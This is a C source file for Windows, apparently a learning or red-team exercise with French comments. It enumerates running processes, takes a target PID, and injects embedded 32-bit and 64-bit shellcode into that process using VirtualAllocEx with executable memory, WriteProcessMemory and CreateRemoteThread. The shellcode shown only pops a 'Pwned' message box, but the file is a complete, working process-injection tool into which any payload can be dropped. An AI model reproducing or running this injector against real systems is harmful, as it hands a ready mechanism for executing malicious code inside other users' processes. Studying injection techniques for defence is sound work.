#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

BOOL isWow64(HANDLE hProcess) {
    BOOL bIsWow64 = FALSE;

    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

    if (fnIsWow64Process) {
        fnIsWow64Process(hProcess, &bIsWow64);
    }

    return bIsWow64;
}

int injectProc(int PID){
    int is64 = 0;
    // MessageBox shellcode
    UCHAR shellcode_32[] = 
        "\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52"
        "\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28"
        "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"
        "\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01"
        "\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x01"
        "\xd3\x8b\x48\x18\x50\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31"
        "\xff\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
        "\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01"
        "\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01"
        "\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58"
        "\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\xe8\x0b\x00\x00"
        "\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x68\x4c"
        "\x77\x26\x07\xff\xd5\x6a\x00\xe8\x06\x00\x00\x00\x50\x77"
        "\x6e\x65\x64\x00\xe8\x11\x00\x00\x00\x49\x6e\x6a\x65\x63"
        "\x74\x65\x64\x20\x62\x79\x20\x52\x69\x64\x61\x00\x6a\x00"
        "\x68\x45\x83\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6"
        "\x95\xbd\x9d\xff\xd5\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb"
        "\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
    UCHAR shellcode_64[] = 
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60"
        "\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
        "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
        "\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
        "\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
        "\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x8b"
        "\x48\x18\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
        "\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
        "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
        "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
        "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
        "\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
        "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
        "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
        "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x11"
        "\x00\x00\x00\x49\x6e\x6a\x65\x63\x74\x65\x64\x20\x62\x79"
        "\x20\x52\x69\x64\x61\x00\x5a\xe8\x06\x00\x00\x00\x50\x77"
        "\x6e\x65\x64\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83\x56"
        "\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d"
        "\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
        "\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

    PUCHAR shellcode = nullptr;
    SIZE_T scSize = 0;
    // PROCESS_ALL_ACCESS -> on va lui trituré les intestins
    // FALSE -> on va pas créer de process child
    // le PID du process cible
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (!isWow64(hProcess)) {
        is64 = 1;
        shellcode = shellcode_64;
        scSize = sizeof(shellcode_64);
    } else {
        shellcode = shellcode_32;
        scSize = sizeof(shellcode_32);
    }
    // MEM_RESERVE -> Reserve un pool d'addr virtuel (Create VAD)
    // MEM_COMMIT -> Selon la taille alloué, pour chaque page 
    //                   -> Alloue une frame physique
    //                   -> Renseigne un PTE (Présent = 1 + (RX + RW)->(PAGE_EXECUTE_READWRITE))
    //                   -> Met à jour le VAD avec les info renseigné + Flush TLB (Translation Look-aside Buffer - Cache processeur pour les pages déjà lus)
    LPVOID memPoolPtr = VirtualAllocEx(hProcess, NULL, scSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (memPoolPtr == NULL) {
	    printf("VirtualAllocEx failed: %ul\n", GetLastError());
	    return 1;
    }
    printf("[+] Mem page allocated at: 0x%p\n", memPoolPtr);
    WriteProcessMemory(hProcess, memPoolPtr, shellcode, scSize, NULL);
    printf("[+] Shellcode %s written\n", is64 ? "64bit" : "32bit");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memPoolPtr, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("CreateRemoteThread failed : %ul\n", GetLastError());
        return 1;
    }
    printf("[+] Remote thread created.\n");
    printf("[+] Waiting for thread.\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Sehellcode done.\n");

    VirtualFreeEx(hProcess, memPoolPtr, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

int enumProc(){
    int proc_cnt = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    Process32First(snapshot, &pe32);

    do {
        printf("[PID: %u] %s\n", pe32.th32ProcessID, pe32.szExeFile);
        proc_cnt++;
    } while (Process32Next(snapshot, &pe32));

    CloseHandle(snapshot);
    return proc_cnt;
}

int main(int argc, char **argv){
    int proc_cnt = enumProc();
    if (proc_cnt <= 0) return 1;

    int choice = -1;
    while (choice <= 0) {
        printf("[PID] > ");
        scanf("%d", &choice);
        if (choice <= 4) {
            printf("[-] Bad PID.\n");
            choice = -1;
        }
    }

    return injectProc(choice);
}